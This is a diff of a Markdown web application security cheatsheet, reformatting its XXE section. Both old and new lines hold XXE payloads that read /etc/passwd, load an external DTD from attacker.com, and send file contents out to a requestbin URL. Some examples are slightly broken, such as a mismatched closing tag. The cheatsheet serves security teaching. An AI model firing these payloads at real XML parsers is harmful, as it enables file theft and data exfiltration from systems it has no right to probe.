@@ -3,8 +3,6 @@ Web Application Security Cheatsheet
 
 ## Table of Contents
 
-_Published 16th April 2018_
-
 - [Session Management](#session-management)  
 - [Authentication - OAuth](#authentication-oath) 
 - [Authentication - SAML](#authentication-saml)  
@@ -57,15 +55,15 @@ Signature Attacks
 **Summary**
 
 Entity Types:
-* General entities - can be used in XML content like &name;  
+* _General entities_ - can be used in XML content like &name;  
   `<!ENTITY name "Hello World">`  
-* Parameter entities - can be used inside doctype definition like %name; (parameter entities can insert new entities) and inside entities values like %name;.  
+* _Parameter entities_ - can be used inside doctype definition like %name; (parameter entities can insert new entities) and inside entities values like %name;.  
   `<!ENTITY % name "Hello World">`  
   `<!ENTITY % name "Hello %myEntity;">`  
-* External entities - entities with query to external (not declared in current XML document) resource (can be used both: general entities and parameter entities)  
+* _External entities_ - entities with query to external (not declared in current XML document) resource (can be used both: general entities and parameter entities)  
   `<!ENTITY name SYSTEM "URI/URL">`  
   `<!ENTITY name PUBLIC "any_text" "URI/URL">`  
-* External entities can be used for doctypes too:  
+* _External entities_ - can be used for doctypes too:  
   `<!DOCTYPE name SYSTEM "address.dtd" [...]>`  
   `<!DOCTYPE name PUBLIC "any text" "http://evil.com/evil.dtd">`  
 
@@ -76,49 +74,48 @@ _XML DTD (XML Document Type Declaration)_ is used to define the structure of the
 **Exploitation**  
 
 Basic XXE Test
-```xml
-<!DOCTYPE test [<!ENTITY example "Hello World"> ]>
-<test>
-  <hello>&example;</hello>
-</userInfo>
-```
+  ```xml
+  <!DOCTYPE test [<!ENTITY example "Hello World"> ]>
+  <test>
+    <hello>&example;</hello>
+  </userInfo>
+  ```
 
 Local File Inclusion  
-```xml
-<!DOCTYPE data [
-  <!ELEMENT lol ANY>
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<lol>&xxe;</lol>
-```
+  ```xml
+  <!DOCTYPE data [
+      <!ELEMENT lol ANY>
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <lol>&xxe;</lol>
+  ```
 
 Remote File Inclusion / SSRF
-_stuff.xml_
-```xml
-<!DOCTYPE data [
-  <!ELEMENT lol ANY>
-  <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
-  &xxe;
-]>
-<lol>&file;</lol>
-```
-_evil.dtd_
-```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-```
+  ```xml
+  <!DOCTYPE data [
+      <!ELEMENT lol ANY>
+      <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
+      &xxe;
+  ]>
+  <lol>&file;</lol>
+  ```  
+  ```xml
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+  ```
 
-XXE Out of Bounds attack (XXE OOB)  
-```xml
-<!DOCTYPE data [
-  <!ELEMENT lol ANY>
-  <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
-  &xxe; &all;
-]>
-```
-```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestbin.fullcontact.com/1cxrgsm1/?%file;'>">
-```
+XXE Out of Bounds attack (XXE OOB) - Sending the response/data to your own server
+  ```xml
+  <!DOCTYPE data [
+    <!ELEMENT lol ANY>
+    <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
+    &xxe;
+  ]>
+  ```
+  ```xml
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % all "<!ENTITY send SYSTEM 'https://requestbin.fullcontact.com/1cxrgsm1/?%file;'>">
+  &all;
+  ```
 
 ### PHP Un-serialize
 ---
